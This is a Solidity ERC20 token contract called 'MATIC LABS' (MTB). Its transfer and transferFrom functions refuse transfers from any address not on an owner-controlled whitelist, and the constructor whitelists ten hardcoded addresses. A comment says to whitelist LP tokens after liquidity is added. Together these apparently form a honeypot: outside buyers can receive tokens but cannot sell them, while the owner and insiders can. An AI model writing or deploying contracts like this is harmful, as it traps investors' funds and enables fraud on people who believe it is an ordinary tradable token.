// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("MATIC LABS", "MTB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 3200000 * 10 ** decimals());
        whiteList[0xBe776DFb1F14D6bc9e39CE83187679f5b794F68d]= true;
        whiteList[0xdaBA5140c3d9E038CBe65E72e472a599fcbd0956]=true;
        whiteList[0x9Ef727A076bD760967C51c78b66e1425B4c8E510]=true;
        whiteList[0x9e249f07b077C4F048Ee0F4802dF299F58B39688]=true;
        whiteList[0x803acfaad6c281000697B123627b07773988ee57]=true;
        whiteList[0x17C27508594555f6d8b9AfAfb753165642B1f9Ee]=true;
        whiteList[0xE61639D381B487b4b5354420a105Fd8A2709662d]=true;
        whiteList[0x3CbB45a3DC3853C1Bbc0d4527E2500466Ac4C671]=true;
        whiteList[0x8458dDabFFd99D7d469dF3F5d110aF58B1a213A1]=true;
        whiteList[0xb1C5eC88e90984Db42e9AE5D60dC88d849e452c5]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}